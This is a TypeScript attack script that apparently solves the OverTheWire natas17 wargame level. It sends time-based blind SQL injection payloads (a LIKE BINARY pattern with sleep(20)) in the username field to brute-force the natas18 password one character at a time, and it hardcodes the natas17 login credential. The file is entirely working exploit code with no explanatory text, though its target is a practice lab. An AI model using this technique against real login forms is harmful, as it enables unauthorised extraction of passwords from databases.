const rp = require('request-promise');
import * as http from "http"
const keepAliveAgent = new http.Agent({
	keepAlive: true,
	maxSockets: 30 
});

const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
let password: any[] = [];
for(let j = 0; j < 32; j++){
	password.push("#");
}


for(let k = 0; k < 32; k++){
	let promiseArray: Promise<string>[] = [];
	for (let i = 0; i < chars.length; i++){
		let baseQuery = `natas18" and if (users.password like BINARY "`;
			for(let j = 0; j < k; j++){
				baseQuery += `_`;
			}
			baseQuery += `${chars[i]}`;
			baseQuery += '%", sleep(20), -1) #';

		let t0 = new Date().getTime();
		let promise = rp.post('http://natas17.natas.labs.overthewire.org/index.php?debug=1', {
			form : {
				username : baseQuery
			},
			pool: keepAliveAgent,
			timeout: 20000 
		})
			.auth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw', true)
			.then((response) => {
			})
			.catch((err) => {
				/*console.error(err);*/
				let t1 = new Date().getTime();
				console.error(`Character was ${chars[i]}, k = ${k}, i = ${i}, time = ${t1 - t0}`);
				return chars[i];
			})
			.then((char) => {
				password[k] = chars[i];
			})
		promiseArray.push(promise);
		baseQuery = "";
	}
}
process.on('exit', function() {
	console.log(password.join(''));
	keepAliveAgent.destroy();
	console.log("Goodbye!");
})
process.on('SIGINT', function() {
	console.log(password.join(''));
	process.exit();
})

